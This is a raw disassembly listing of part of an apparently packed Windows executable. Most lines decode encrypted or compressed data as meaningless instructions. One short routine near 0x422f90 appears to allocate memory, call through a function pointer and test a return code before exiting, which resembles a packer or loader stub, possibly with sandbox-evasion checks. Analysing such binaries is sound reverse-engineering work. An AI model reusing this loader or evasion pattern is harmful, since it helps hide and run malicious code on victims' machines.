  422ae5:	ss pop ss
  422ae7:	xor    BYTE PTR [bp+di],ah
  422aea:	push   0xb57188e
  422aef:	mov    ah,0xdd
  422af1:	cmp    al,BYTE PTR [edx+0x4d9aa917]
  422af7:	mov    esi,0x60782a6
  422afc:	pop    ss
  422afd:	in     eax,dx
  422afe:	lock push ss
  422b00:	add    al,0x28
  422b02:	mov    WORD PTR [edi-0x19933fad],cs
  422b08:	scas   al,BYTE PTR es:[edi]
  422b09:	push   ecx
  422b0a:	mov    ebx,0xc7757c83
  422b0f:	data16 imul BYTE PTR [ecx+0x3d6c8de6]
  422b16:	sbb    BYTE PTR [eax-0x22],cl
  422b19:	mov    dl,0x79
  422b1b:	jnp    0x422b01
  422b1d:	pop    esi
  422b1e:	nop
  422b1f:	call   0x830f:0xc8b24b83
  422b26:	std    
  422b27:	jge    0x422b59
  422b29:	pop    ds
  422b2a:	nop
  422b2b:	pop    esi
  422b2c:	inc    esp
  422b2d:	xor    al,0xd8
  422b2f:	mov    bh,0x52
  422b31:	push   0xed1f3f25
  422b36:	(bad)  
  422b37:	pop    ss
  422b38:	xchg   edi,eax
  422b39:	test   al,0x9d
  422b3b:	jo     0x422b5a
  422b3d:	inc    eax
  422b3e:	sbb    DWORD PTR [edi-0x18622156],0x97348c6
  422b48:	or     al,0x12
  422b4a:	sahf   
  422b4b:	xor    DWORD PTR [edi],ecx
  422b4d:	(bad)  
  422b4f:	stc    
  422b50:	mov    eax,ds:0x76aac649
  422b55:	push   cs
  422b56:	mov    edx,0x713271d6
  422b5b:	mov    dl,0x9a
  422b5d:	jmp    0x2b4dee15
  422b62:	(bad)  
  422b63:	shl    ecx,1
  422b65:	inc    esi
  422b66:	(bad)  
  422b67:	sub    dl,cl
  422b69:	sbb    BYTE PTR [eax-0x6c7c702a],dl
  422b6f:	mov    dl,0xbf
  422b71:	push   0x575d2361
  422b76:	imul   ebp,edx,0x5178bd27
  422b7c:	jecxz  0x422b67
  422b7e:	retf   
  422b7f:	jecxz  0x422b14
  422b81:	out    0x15,eax
  422b83:	mov    DWORD PTR [esp+edx*1-0x3e31a0e8],0x3b648a8b
  422b8e:	clc    
  422b8f:	xchg   ecx,eax
  422b90:	repz sub al,0x42
  422b93:	je     0x422bd0
  422b95:	sub    esp,DWORD PTR [esi+0x74]
  422b98:	cmp    bl,dl
  422b9a:	and    ecx,ebp
  422b9c:	pop    esi
  422b9d:	in     al,0x46
  422b9f:	ret    
  422ba0:	jnp    0x422bc0
  422ba2:	adc    DWORD PTR [ebx*8+0x5ed379a6],esi
  422ba9:	and    eax,0x794d468a
  422bae:	daa    
  422baf:	in     eax,0x45
  422bb1:	inc    esi
  422bb2:	ret    0xd5d7
  422bb5:	push   esi
  422bb6:	or     eax,0xea2c7bf0
  422bbb:	mov    al,0xfe
  422bbd:	mov    edx,0x1827564b
  422bc2:	cmp    BYTE PTR [ecx+esi*8-0x6dcc0b72],al
  422bc9:	outs   dx,DWORD PTR ds:[esi]
  422bca:	data16 sub cl,al
  422bcd:	inc    edx
  422bce:	pop    esi
  422bcf:	lock sub BYTE PTR [eax+0x44daf979],dh
  422bd6:	adc    ecx,esp
  422bd8:	shl    DWORD PTR [esi-0x65],1
  422bdb:	les    esi,FWORD PTR [esi]
  422bdd:	out    0x83,eax
  422bdf:	fild   WORD PTR [eax+0xabdab08]
  422be5:	pop    esi
  422be6:	sub    ebp,DWORD PTR [eax+0x5c1d416d]
  422bec:	sub    al,0x1d
  422bee:	out    0xdd,eax
  422bf0:	cmp    al,0xaa
  422bf2:	repnz not DWORD PTR [eax-0x6e]
  422bf6:	shr    BYTE PTR [ebx],1
  422bf8:	gs es add edx,ebx
  422bfc:	mov    eax,0xd840eacd
  422c01:	setne  BYTE PTR [esi-0x7d53d441]
  422c08:	inc    edi
  422c09:	je     0xe40286b0
  422c0f:	fild   QWORD PTR [ebx]
  422c11:	stos   BYTE PTR es:[edi],al
  422c12:	dec    DWORD PTR cs:[ecx]
  422c15:	aaa    
  422c16:	ins    DWORD PTR es:[edi],dx
  422c17:	icebp  
  422c18:	hlt    
  422c19:	ficomp DWORD PTR [ebx]
  422c1b:	add    BYTE PTR ds:0xde30370,cl
  422c21:	mov    ecx,DWORD PTR [edx+0x43]
  422c24:	push   cs
  422c25:	cld    
  422c26:	adc    BYTE PTR [edi+0x57],bh
  422c29:	mov    ebx,0x94e1b39c
  422c2e:	xchg   esp,eax
  422c2f:	xchg   esi,eax
  422c30:	std    
  422c31:	jmp    0x422c17
  422c33:	or     eax,0xa5456051
  422c38:	rcr    BYTE PTR [esi+0x4376913b],0xa6
  422c3f:	pop    ds
  422c40:	jp     0x422c63
  422c42:	clc    
  422c43:	dec    edi
  422c44:	sbb    BYTE PTR [edi+0x65],ch
  422c47:	xchg   esp,eax
  422c48:	dec    eax
  422c49:	scas   eax,DWORD PTR es:[edi]
  422c4a:	iret   
  422c4b:	mov    al,ds:0x5a779120
  422c50:	call   0xa06e:0x799f376b
  422c57:	ret    0xa579
  422c5a:	mov    ebx,0xe218cd89
  422c5f:	in     eax,dx
  422c60:	cdq    
  422c61:	sub    eax,0x6a6fad33
  422c66:	jmp    0xe20a4c4f
  422c6b:	push   esi
  422c6c:	arpl   WORD PTR [esi-0x66],dx
  422c6f:	out    dx,al
  422c70:	sti    
  422c71:	fxch   st(2)
  422c73:	jl     0x422c22
  422c75:	sub    cl,BYTE PTR [ebx+ebx*8]
  422c78:	loope  0x422c67
  422c7a:	cmp    eax,0x478428bb
  422c7f:	jb     0x422c74
  422c81:	not    ch
  422c83:	push   0x2d
  422c85:	xchg   edx,eax
  422c86:	dec    ecx
  422c87:	jns    0x422c57
  422c89:	stc    
  422c8a:	push   eax
  422c8b:	push   ebx
  422c8c:	adc    eax,0xb1b66d1
  422c91:	imul   esi,DWORD PTR [edx],0x218c83f5
  422c97:	in     al,dx
  422c98:	add    eax,0x40724dc1
  422c9d:	mov    bh,0x3c
  422c9f:	xor    dl,cl
  422ca1:	idiv   DWORD PTR [ecx]
  422ca3:	cmp    ebx,ebx
  422ca5:	jno    0x422c75
  422ca7:	dec    ebx
  422ca8:	loop   0x422c62
  422caa:	mov    BYTE PTR [edx-0x481c1eb8],cl
  422cb0:	js     0x422c74
  422cb2:	cmp    DWORD PTR [ebp-0x58],edi
  422cb5:	pop    esi
  422cb6:	adc    eax,0x2f64639b
  422cbb:	mov    DWORD PTR [ecx-0x32],esp
  422cbe:	sbb    DWORD PTR ds:[edx-0x314c3956],eax
  422cc5:	sub    al,0xe6
  422cc7:	xor    al,0xae
  422cc9:	or     DWORD PTR [edx-0x7e4cc76e],edi
  422ccf:	enter  0x8b59,0x72
  422cd3:	push   eax
  422cd4:	xchg   edi,eax
  422cd5:	out    0x35,al
  422cd7:	int3   
  422cd8:	cli    
  422cd9:	sub    bl,cl
  422cdb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422cdc:	xchg   edx,eax
  422cdd:	mov    ds:0x73bebeff,al
  422ce2:	add    eax,0x50acd845
  422ce7:	mov    eax,0xcb0ee3ab
  422cec:	(bad)  
  422ced:	pop    eax
  422cee:	sbb    DWORD PTR [eax],ecx
  422cf0:	sub    al,0xc6
  422cf2:	and    cl,BYTE PTR [edi+0x3]
  422cf5:	sub    DWORD PTR [ebx-0x27],0x3a
  422cf9:	out    0x9e,eax
  422cfb:	sbb    bh,BYTE PTR [edx-0x43e724b1]
  422d01:	inc    esp
  422d02:	push   ecx
  422d03:	std    
  422d04:	stc    
  422d05:	popf   
  422d06:	jl     0x422d45
  422d08:	fimul  WORD PTR [ebp-0x63]
  422d0b:	sub    eax,0xca4548ff
  422d10:	lods   eax,DWORD PTR ds:[esi]
  422d11:	mov    ds:0xa6752bde,eax
  422d16:	in     eax,0x76
  422d18:	inc    edi
  422d19:	fidivr WORD PTR [eax+eax*1-0x2095d734]
  422d20:	stos   DWORD PTR es:[edi],eax
  422d21:	retf   
  422d22:	jge    0x422d10
  422d24:	sbb    al,0x28
  422d26:	scas   eax,DWORD PTR es:[edi]
  422d27:	aam    0xc1
  422d29:	xchg   esp,eax
  422d2a:	xor    eax,edi
  422d2c:	hlt    
  422d2d:	lods   eax,DWORD PTR ds:[esi]
  422d2e:	xor    ah,ch
  422d30:	sbb    bh,dh
  422d32:	dec    edi
  422d33:	outs   dx,DWORD PTR ds:[esi]
  422d34:	popa   
  422d35:	cmp    dl,BYTE PTR [edi-0x2f]
  422d38:	stc    
  422d39:	jmp    0x422d32
  422d3b:	xor    edx,ecx
  422d3d:	mov    ecx,0x510bd53c
  422d42:	cld    
  422d43:	jmp    0xc974b5ad
  422d48:	fadd   st,st(6)
  422d4a:	inc    esp
  422d4b:	sub    eax,0xc35fa597
  422d50:	xchg   BYTE PTR [esi],cl
  422d52:	js     0x422d02
  422d54:	xor    ah,BYTE PTR [ebx-0x7a]
  422d57:	inc    edi
  422d58:	ja     0x422d3b
  422d5a:	dec    ebp
  422d5b:	mov    BYTE PTR [eax-0x7c],bh
  422d5e:	adc    BYTE PTR [ebx+esi*1-0x1361c4a5],cl
  422d65:	cli    
  422d66:	xor    DWORD PTR fs:[ecx],edi
  422d69:	fld    DWORD PTR [edi-0xe]
  422d6c:	push   eax
  422d6d:	mov    BYTE PTR [ebp+ecx*1+0x22e0bf02],al
  422d74:	ins    DWORD PTR es:[edi],dx
  422d75:	dec    edx
  422d76:	inc    edx
  422d77:	adc    eax,0xc691ffab
  422d7c:	jmp    0xcea4:0xc18ebd38
  422d83:	jge    0x422d82
  422d85:	scas   eax,DWORD PTR es:[edi]
  422d86:	mov    ecx,0xe0a3e09e
  422d8b:	popa   
  422d8c:	dec    ebp
  422d8d:	cmp    cl,BYTE PTR [edx-0x10df80f9]
  422d93:	inc    ecx
  422d94:	repnz inc esi
  422d96:	pop    ebx
  422d97:	leave  
  422d98:	mov    ds:0xf3681fbe,al
  422d9d:	jo     0x422db6
  422d9f:	add    BYTE PTR [ebx+0x69],ah
  422da2:	fwait
  422da3:	and    DWORD PTR [ebx-0x218a8333],eax
  422da9:	xor    al,0xf6
  422dab:	fadd   QWORD PTR [eax]
  422dad:	add    DWORD PTR [ebx+ebx*1],ecx
  422db0:	out    dx,eax
  422db1:	aam    0x6a
  422db3:	adc    al,0xcb
  422db5:	mov    edx,0x370463fc
  422dba:	dec    eax
  422dbb:	(bad)  
  422dbc:	ficomp DWORD PTR [esi+edx*8+0x30127853]
  422dc3:	out    dx,al
  422dc4:	xlat   BYTE PTR ds:[bx]
  422dc6:	pop    ds
  422dc7:	xor    ebx,eax
  422dc9:	iret   
  422dca:	add    al,0x2f
  422dcc:	sbb    BYTE PTR [ebp*1+0x6b389eb4],dh
  422dd3:	adc    BYTE PTR [ebp-0x79],ch
  422dd6:	mov    eax,ds:0x5d344eee
  422ddb:	fiadd  DWORD PTR [edx]
  422ddd:	or     DWORD PTR [esi-0x1836a9ab],eax
  422de3:	stos   BYTE PTR es:[edi],al
  422de4:	pop    ecx
  422de5:	and    dh,BYTE PTR [ebx-0x63672cc]
  422deb:	or     al,0xc8
  422ded:	pop    edx
  422dee:	and    BYTE PTR [edi-0x19],cl
  422df1:	or     al,0x72
  422df3:	jae    0x422dfd
  422df5:	push   esi
  422df6:	jp     0x422ddd
  422df8:	sub    DWORD PTR [edx],ebx
  422dfa:	arpl   sp,dx
  422dfc:	neg    DWORD PTR [ecx-0x77]
  422dff:	xchg   edx,eax
  422e00:	mov    bh,0x38
  422e02:	dec    ecx
  422e03:	imul   BYTE PTR [ecx-0x272bd194]
  422e09:	ret    
  422e0a:	in     eax,0xd6
  422e0c:	sbb    DWORD PTR [ebp-0x24],0xffffffbb
  422e10:	sub    BYTE PTR [edx],bl
  422e12:	push   cs
  422e13:	mov    eax,ds:0xcd9b1efb
  422e18:	cmc    
  422e19:	jno    0x422e80
  422e1b:	add    dl,al
  422e1d:	shl    BYTE PTR [edi+0x7beae308],0xde
  422e24:	out    0xa5,al
  422e26:	pop    esi
  422e27:	adc    DWORD PTR [esi-0x262fcd67],esi
  422e2d:	imul   ebp,ecx,0x52
  422e30:	jb     0x422e2e
  422e32:	mov    edi,0x5919961c
  422e37:	rol    BYTE PTR [ebp-0x44],1
  422e3a:	loop   0x422e4c
  422e3c:	push   ecx
  422e3d:	add    cl,BYTE PTR [esi+0x69664abf]
  422e43:	popa   
  422e44:	xchg   ebp,eax
  422e45:	or     edi,edi
  422e47:	mov    WORD PTR [ebp+0x1],es
  422e4a:	es leave 
  422e4c:	sub    al,0x45
  422e4e:	aas    
  422e4f:	mov    bl,0xdb
  422e51:	outs   dx,BYTE PTR ds:[esi]
  422e52:	sub    al,0x47
  422e54:	and    eax,0x81da83ea
  422e59:	add    eax,0x99d5bf59
  422e5e:	sahf   
  422e5f:	not    DWORD PTR es:[ebp+0x61]
  422e63:	jmp    0x61d6782a
  422e68:	dec    eax
  422e69:	and    BYTE PTR [esi-0xa],bl
  422e6c:	mov    edx,0x80ca7d3e
  422e71:	ret    0x8057
  422e74:	cmp    al,0xeb
  422e76:	add    esp,DWORD PTR [esi-0x363c0a80]
  422e7c:	shl    ah,0xa2
  422e7f:	dec    edx
  422e80:	leave  
  422e81:	popa   
  422e82:	mov    bl,0x3f
  422e84:	mov    ch,bh
  422e86:	jo     0x422e91
  422e88:	add    ch,BYTE PTR ds:0xd3947211
  422e8e:	mov    ecx,0xcaa1f6b9
  422e93:	fs push 0xffffffa0
  422e96:	pop    eax
  422e97:	das    
  422e98:	lods   al,BYTE PTR ds:[esi]
  422e99:	mov    ah,BYTE PTR [ecx]
  422e9b:	pop    edx
  422e9c:	fisub  WORD PTR ds:0x45d7bb14
  422ea2:	mov    dh,0x11
  422ea4:	imul   eax,DWORD PTR [edx],0x66
  422ea7:	into   
  422ea8:	mov    ds:0x6850433a,al
  422ead:	jne    0x422e43
  422eaf:	cmp    cl,BYTE PTR [ecx+0x32]
  422eb2:	mov    al,ds:0xa2af73ae
  422eb7:	shl    BYTE PTR [ebx-0x4b],cl
  422eba:	adc    DWORD PTR [ebp+0x10bcbb4f],eax
  422ec0:	mov    al,ds:0xcc82a4e6
  422ec5:	or     dh,BYTE PTR [eax-0x2f]
  422ec8:	leave  
  422ec9:	adc    esi,edi
  422ecb:	mov    WORD PTR [ebp+ebp*1+0x23],ss
  422ecf:	add    al,0xa7
  422ed1:	mov    ah,0xfb
  422ed3:	ret    0x7dee
  422ed6:	aad    0x28
  422ed8:	mov    ch,0x5a
  422eda:	push   esp
  422edb:	nop
  422edc:	mov    edx,0xd5d3a6d0
  422ee1:	out    dx,eax
  422ee2:	inc    ebp
  422ee3:	push   ds
  422ee4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422ee5:	push   ss
  422ee6:	mov    bl,0x46
  422ee8:	jg     0x422e81
  422eea:	dec    edi
  422eeb:	jae    0x422ec8
  422eed:	jbe    0x422e78
  422eef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422ef0:	into   
  422ef1:	and    BYTE PTR [ebp-0x6400efcb],al
  422ef7:	(bad)  
  422ef8:	xlat   BYTE PTR ds:[ebx]
  422ef9:	int    0xe1
  422efb:	xor    al,0x96
  422efd:	sbb    ecx,DWORD PTR [edx+0x4ad25778]
  422f03:	adc    BYTE PTR [edx],cl
  422f05:	shl    DWORD PTR [ecx],1
  422f07:	loop   0x422f55
  422f09:	bound  ecx,QWORD PTR [ebx+0x73]
  422f0c:	mov    eax,0x2ab6b21b
  422f11:	sbb    ebx,esi
  422f13:	jo     0x422f0a
  422f15:	mov    DWORD PTR [edi-0x216ba6cb],esi
  422f1b:	test   eax,0xfe2967e4
  422f20:	outs   dx,DWORD PTR ds:[esi]
  422f21:	stc    
  422f22:	repz (bad) 
  422f24:	cmc    
  422f25:	das    
  422f26:	je     0x422eda
  422f28:	mov    bh,0xdf
  422f2a:	mov    dh,0xcb
  422f2d:	int    0x74
  422f2f:	jl     0x422f46
  422f31:	dec    esi
  422f32:	push   esp
  422f33:	push   es
  422f34:	mov    ebp,0x70782d24
  422f39:	xor    al,0x63
  422f3b:	sbb    edi,DWORD PTR [ebp+0x4ea01b66]
  422f41:	in     eax,0x9f
  422f43:	sahf   
  422f44:	outs   dx,DWORD PTR ds:[esi]
  422f45:	mov    ecx,0x7dc2fb7
  422f4a:	add    DWORD PTR [ebx-0x34],ecx
  422f4d:	mov    eax,0xdb9ed94b
  422f52:	mov    eax,0xf3b4dd7a
  422f57:	fld    DWORD PTR [ebx+0x49]
  422f5a:	inc    ebp
  422f5b:	pushf  
  422f5c:	ins    DWORD PTR es:[edi],dx
  422f5d:	pop    ss
  422f5e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422f5f:	mov    dl,0x3a
  422f61:	pop    ds
  422f62:	xor    cl,dh
  422f64:	lods   al,BYTE PTR ds:[esi]
  422f65:	sbb    BYTE PTR [ebp+0x67],0x1c
  422f69:	xor    al,0x3
  422f6b:	stos   BYTE PTR es:[edi],al
  422f6c:	sbb    eax,DWORD PTR [edx]
  422f6e:	or     al,0xe8
  422f70:	inc    ebx
  422f71:	nop
  422f72:	out    0x88,al
  422f74:	mov    cl,0x99
  422f76:	mov    esi,0xb81ce818
  422f7b:	add    DWORD PTR [eax],eax
  422f7d:	add    BYTE PTR [eax],al
  422f7f:	mov    esp,ebp
  422f81:	pop    ebp
  422f82:	ret    
  422f83:	int3   
  422f84:	int3   
  422f85:	int3   
  422f86:	int3   
  422f87:	int3   
  422f88:	int3   
  422f89:	int3   
  422f8a:	int3   
  422f8b:	int3   
  422f8c:	int3   
  422f8d:	int3   
  422f8e:	int3   
  422f8f:	int3   
  422f90:	push   ebp
  422f91:	mov    ebp,esp
  422f93:	sub    esp,0x8
  422f96:	push   esi
  422f97:	push   0x0
  422f99:	mov    DWORD PTR [ebp-0x4],0x0
  422fa0:	call   DWORD PTR ds:0x42905c
  422fa6:	mov    esi,DWORD PTR ds:0x429030
  422fac:	push   0x4
  422fae:	push   0x1000
  422fb3:	push   0x4cf
  422fb8:	push   0x1000
  422fbd:	mov    DWORD PTR [ebp-0x8],esi
  422fc0:	call   DWORD PTR ds:0x429058
  422fc6:	test   esi,esi
  422fc8:	jne    0x422fd2
  422fca:	push   esi
  422fcb:	push   esi
  422fcc:	call   DWORD PTR ds:0x429014
  422fd2:	push   0xa
  422fd4:	push   0x0
  422fd6:	push   0x0
  422fd8:	call   DWORD PTR ds:0x429054
  422fde:	push   0x0
  422fe0:	push   0x4e
  422fe2:	push   0x1e
  422fe4:	push   0x0
  422fe6:	push   0xffffffff
  422fe8:	call   DWORD PTR ds:0x429088
  422fee:	test   eax,eax
  422ff0:	je     0x422ffa
  422ff2:	push   0x0
  422ff4:	call   DWORD PTR ds:0x42904c
  422ffa:	mov    esi,DWORD PTR [ebp-0x8]
  422ffd:	call   esi
  422fff:	mov    DWORD PTR [ebp-0x4],eax
  423002:	cmp    DWORD PTR [ebp-0x4],0x57
  423006:	jne    0x42301d
  423008:	push   0xc22ca656
  42300d:	call   0x4111f0
  423012:	add    esp,0x4
  423015:	push   0x0
  423017:	call   DWORD PTR ds:0x429048
  42301d:	push   0x0
  42301f:	call   DWORD PTR ds:0x429044
  423025:	xor    eax,eax
  423027:	pop    esi
  423028:	mov    esp,ebp
  42302a:	pop    ebp
  42302b:	ret    
  42302c:	nop
  42302d:	nop
  42302e:	nop
  42302f:	nop
  423030:	sub    esp,0x10
  423033:	push   esi
  423034:	mov    esi,DWORD PTR ds:0x42915c
  42303a:	push   0x5
  42303c:	push   0x0
  42303e:	call   esi
  423040:	push   0x5
  423042:	push   0x0
  423044:	call   esi
  423046:	push   0x0
  423048:	push   0x0
  42304a:	push   0x0
  42304c:	call   DWORD PTR ds:0x429040
  423052:	lea    eax,[esp+0x4]
  423056:	push   eax
  423057:	call   DWORD PTR ds:0x429068
  42305d:	call   DWORD PTR ds:0x429064
  423063:	cmp    WORD PTR [esp+0x4],0x0
  423069:	pop    esi
  42306a:	push   0x0
  42306c:	je     0x42308f
  42306e:	push   0x0
  423070:	push   0x100000
  423075:	call   DWORD PTR ds:0x429060
  42307b:	push   0x0
  42307d:	call   0x422f90
  423082:	add    esp,0x4
  423085:	call   0x411000
  42308a:	jmp    0x4244c4
  42308f:	push   0x3d
  423091:	push   0x20
  423093:	call   0x4244f6
  423098:	push   DWORD PTR ds:0xd15d4e25
  42309e:	dec    ebx
  42309f:	test   BYTE PTR [ebx+0x5c],0x68
  4230a3:	add    eax,0x7f8762d6
  4230a8:	fsubrp st(5),st
  4230aa:	ror    BYTE PTR [ebx-0xa],cl
  4230ad:	dec    ebx
  4230ae:	pop    eax
  4230af:	push   0x789d9605
  4230b4:	jg     0x423094
  4230b6:	pop    ebp
  4230b7:	ror    BYTE PTR [ebx-0xa],cl
  4230ba:	dec    ebx
  4230bb:	pop    eax
  4230bc:	push   0x789dd605
  4230c1:	jg     0x4230a1
  4230c3:	pop    ebp
  4230c4:	ror    BYTE PTR [ebx-0xa],cl
  4230c7:	dec    ebx
  4230c8:	pop    eax
  4230c9:	push   0x789dd605
  4230ce:	jg     0x4230ae
  4230d0:	pop    ebp
  4230d1:	ror    BYTE PTR [ebx-0xa],cl
  4230d4:	dec    ebx
  4230d5:	mov    al,ds:0x93d60568
  4230da:	vminps xmm4,xmm5,XMMWORD PTR [bp+0x42]
  4230e0:	cmp    ebp,DWORD PTR [edx-0x20]
  4230e3:	imul   ecx,DWORD PTR [ecx+0x1b],0xb7172cbc
  4230ea:	repnz cmp eax,DWORD PTR cs:[esp-0x449be5c1]
  4230f3:	mov    ebp,0x33b01e1b
  4230f8:	mov    ebp,0x3d29d63f
  4230fd:	dec    eax
  4230fe:	ja     0x4230a3
  423100:	repz pop eax
  423102:	push   ss
  423103:	mov    al,0x7d
  423105:	xchg   esi,eax
  423106:	add    al,0xa5
  423108:	imul   esi,DWORD PTR ds:0xb3b36107,0x75
  42310f:	jb     0x4230e5
  423111:	jns    0x4230e5
  423113:	dec    ebx
  423114:	test   BYTE PTR [ebx+0x58],0x68
  423118:	add    eax,0x268404d1
  42311d:	popf   
  42311e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42311f:	inc    eax
  423120:	inc    ecx
  423121:	mov    ch,0xb3
  423123:	retf   0x4662
  423126:	cs (bad) 
  423129:	daa    
  42312a:	mov    ebx,0xe14d851
  42312f:	fst    DWORD PTR [edx+0x30]
  423132:	pusha  
  423133:	out    dx,al
  423134:	xchg   edi,eax
  423135:	mov    edx,0x8a574c87
  42313a:	cs iret 
  42313c:	inc    ecx
  42313d:	xor    BYTE PTR [eax-0x94e2369],dl
  423143:	inc    esi
  423144:	aam    0x1b
  423146:	sub    bl,cl
  423148:	cld    
  423149:	add    eax,ebx
  42314b:	jns    0x42315c
  42314d:	pushf  
  42314e:	gs jmp 0xae41:0xd3dd9475
  423156:	mov    bl,0xca
  423158:	bound  eax,QWORD PTR [esi+0x2e]
  42315b:	push   cs
  42315c:	jb     0x4231b5
  42315e:	daa    
  42315f:	iret   
  423160:	fdiv   st,st(4)
  423162:	cs retf 
  423164:	push   edx
  423165:	and    eax,0x209744fd
  42316a:	sbb    ah,bl
  42316c:	push   edi
  42316d:	fidiv  DWORD PTR [ebx+0xd004164]
  423173:	or     eax,0xed80dfdc
  423178:	aam    0x5
  42317a:	mov    bh,0x44
  42317c:	cld    
  42317d:	or     DWORD PTR [eax-0xb7bf006],esp
  423183:	sbb    edx,DWORD PTR [edi]
  423185:	popf   
  423186:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423187:	inc    eax
  423188:	inc    ecx
  423189:	test   BYTE PTR [ebx+0x58],0x68
  42318d:	add    eax,0x2f789dd6
  423192:	fwait
  423193:	pop    ebp
  423194:	rol    BYTE PTR [edi],cl
  423196:	test   DWORD PTR [ecx+0x58],0xd289e684
  42319d:	js     0x42321e
  42319f:	ficomp WORD PTR [ebp-0x2e]
  4231a2:	dec    ebx
  4231a3:	test   BYTE PTR [ebx-0x48],0x68
  4231a7:	push   es
  4231a8:	xlat   BYTE PTR ds:[ebx]
  4231a9:	xchg   esi,eax
  4231aa:	jns    0x423221
  4231ac:	ficomp WORD PTR [ebp+0x3e]
  4231af:	dec    edi
  4231b0:	test   BYTE PTR [ebx+0x5c],0x6e
  4231b4:	add    eax,0x7f789dd6
  4231b9:	fnstsw ax
  4231bb:	ror    BYTE PTR [ebx-0xa],cl
  4231be:	pop    ebx
  4231bf:	pop    eax
  4231c0:	push   0x7898d605
  4231c5:	jg     0x4231a5
  4231c7:	sbb    al,0xd2
  4231c9:	dec    ebx
  4231ca:	out    0x4b,al
  4231cc:	pop    eax
  4231cd:	push   0x7d9dd607
  4231d2:	jg     0x4231b3
  4231d4:	pop    ebp
  4231d5:	ror    BYTE PTR [ebx-0xa],cl
  4231d8:	dec    ebx
  4231d9:	pop    ebp
  4231da:	push   0x789dd604
  4231df:	jg     0x4231bf
  4231e1:	pop    ebp
  4231e2:	push   edx
  4231e3:	inc    eax
  4231e4:	test   BYTE PTR [ebx+0x5c],0x68
  4231e8:	add    eax,0x7f7dac6b
  4231ed:	fcomp  QWORD PTR [ebp-0x2e]
  4231f0:	retf   
  4231f1:	test   BYTE PTR [ebx+0x48],0x68
  4231f5:	add    eax,0x7f789dc6
  4231fa:	fimul  WORD PTR [ebp-0x2e]
  4231fd:	dec    ebx
  4231fe:	out    0x4b,al
  423200:	pop    eax
  423201:	push   0x689dd605
  423206:	jg     0x4231e6
  423208:	pop    ebp
  423209:	ror    BYTE PTR [ebx-0xa],cl
  42320c:	dec    ebx
  42320d:	pop    eax
  42320e:	push   0x1619d605
  423213:	je     0x4231f3
  423215:	xor    al,0xd1
  423217:	dec    ebx
  423218:	test   BYTE PTR [ebx+0x68],0x63
  42321c:	add    eax,0x7f78a019
  423221:	ficomp WORD PTR [ebp-0x2e]
  423224:	dec    ebx
  423225:	test   BYTE PTR [ebx+0x58],0x68
  423229:	add    eax,0x7f789dd6
  42322e:	ficomp WORD PTR [ebp-0x2e]
  423231:	dec    ebx
  423232:	test   BYTE PTR [ebx+0x58],0x68
  423236:	add    eax,0x7f789dd6
  42323b:	ficomp WORD PTR [ebp-0x2e]
  42323e:	dec    ebx
  42323f:	test   BYTE PTR [ebx+0x58],0x68
  423243:	add    eax,0x7f789dd6
  423248:	ficomp WORD PTR [ebp-0x2e]
  42324b:	dec    ebx
  42324c:	test   BYTE PTR [ebx+0x58],0x68
  423250:	add    eax,0x7f789dd6
  423255:	ficomp WORD PTR [ebp-0x2e]
  423258:	dec    ebx
  423259:	test   BYTE PTR [ebx+0x58],0x68
  42325d:	add    eax,0x7f789dd6
  423262:	ficomp WORD PTR [ebp-0x2e]
  423265:	dec    ebx
  423266:	test   BYTE PTR [ebx+0x58],0x68
  42326a:	add    eax,0x7f789dd6
  42326f:	ficomp WORD PTR [ebp-0x2e]
  423272:	dec    ebx
  423273:	test   BYTE PTR [ebx+0x58],0x68
  423277:	add    eax,0x7f789dd6
  42327c:	ficomp WORD PTR [ebp-0x2e]
  42327f:	dec    ebx
  423280:	test   BYTE PTR [ebx+0x58],0x68
  423284:	add    eax,0x7f789dd6
  423289:	lock sub DWORD PTR [edi+0x584b8233],esi
  423290:	push   0x7896f605
  423295:	jg     0x423265
  423297:	pop    ebp
  423298:	ror    BYTE PTR [ebx-0x34],cl
  42329b:	dec    edi
  42329c:	pop    eax
  42329d:	push   0x289dd601
  4232a2:	cmp    bl,BYTE PTR [ebp-0x9fb7991]
  4232a8:	dec    ebx
  4232a9:	pop    eax
  4232aa:	push   0x78bdd605
  4232af:	jg     0x4232ef
  4232b1:	jae    0x423253
  4232b3:	cmp    BYTE PTR [eax+ebp*1-0x29fa97a8],al
  4232ba:	int    0x78
  4232bc:	jg     0x42329c
  4232be:	ins    DWORD PTR es:[edi],dx
  4232bf:	(bad)  [ebx-0xa]
  4232c2:	sbb    ebx,DWORD PTR [eax+0x68]
  4232c5:	add    eax,0x7f7899e8
  4232ca:	ficomp WORD PTR [ebp-0x2e]
  4232cd:	dec    ebx
  4232ce:	test   BYTE PTR [ebx+0x58],0x68
  4232d2:	add    eax,0x7f589dd6
  4232d7:	fidivr WORD PTR [ebp+0x4bf64bd2]
  4232dd:	pop    eax
  4232de:	push   0x789dd605
  4232e3:	jg     0x4232c3
  4232e5:	pop    ebp
  4232e6:	ror    BYTE PTR [ebx-0xa],cl
  4232e9:	dec    ebx
  4232ea:	pop    eax
  4232eb:	push   0x789dd605
  4232f0:	jg     0x4232d0
  4232f2:	pop    ebp
  4232f3:	ror    BYTE PTR [ebx-0xa],cl
  4232f6:	dec    ebx
  4232f7:	pop    eax
  4232f8:	push   0x789dd605
  4232fd:	jg     0x4232dd
  4232ff:	pop    ebp
  423300:	ror    BYTE PTR [ebx-0xa],cl
  423303:	dec    ebx
  423304:	pop    eax
  423305:	push   0x789dd605
  42330a:	jg     0x4232ea
  42330c:	pop    ebp
  42330d:	ror    BYTE PTR [ebx-0xa],cl
  423310:	dec    ebx
  423311:	pop    eax
  423312:	push   0x789dd605
  423317:	jg     0x4232f7
  423319:	pop    ebp
  42331a:	ror    BYTE PTR [ebx-0xa],cl
  42331d:	dec    ebx
  42331e:	pop    eax
  42331f:	push   0x789dd605
  423324:	jg     0x423304
  423326:	pop    ebp
  423327:	ror    BYTE PTR [ebx-0xa],cl
  42332a:	dec    ebx
  42332b:	pop    eax
  42332c:	push   0x789dd605
  423331:	jg     0x423311
  423333:	pop    ebp
  423334:	ror    BYTE PTR [ebx-0xa],cl
  423337:	dec    ebx
  423338:	pop    eax
  423339:	push   0x789dd605
  42333e:	jg     0x42331e
  423340:	pop    ebp
  423341:	ror    BYTE PTR [ebx-0xa],cl
